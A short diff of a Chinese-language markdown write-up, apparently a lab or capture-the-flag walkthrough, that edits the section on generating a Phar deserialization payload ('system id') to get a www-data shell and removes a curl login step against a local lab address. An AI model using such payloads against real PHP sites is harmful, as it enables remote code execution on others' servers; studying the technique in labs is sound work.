@@ -391,7 +391,7 @@ file_put_contents($out . '.url', rawurlencode($data));
 ```bash
 php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 ```
-
+![](file-20260606123033226.png)
 生成出来的 `poc.bin.url` 是 URL 编码后的 Phar 二进制，拿它去提交。
 
 # 直接 getshell（www-data RCE）
@@ -408,15 +408,6 @@ php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 level = system
 arg   = id
 ```
-
-先登录：
-
-```bash
-curl -c cookie.txt -b cookie.txt -X POST \
-  -d 'username=admin&password=admin' \
-  'http://192.168.56.109/'
-```
-
 然后提交 payload：
 
 ```bash
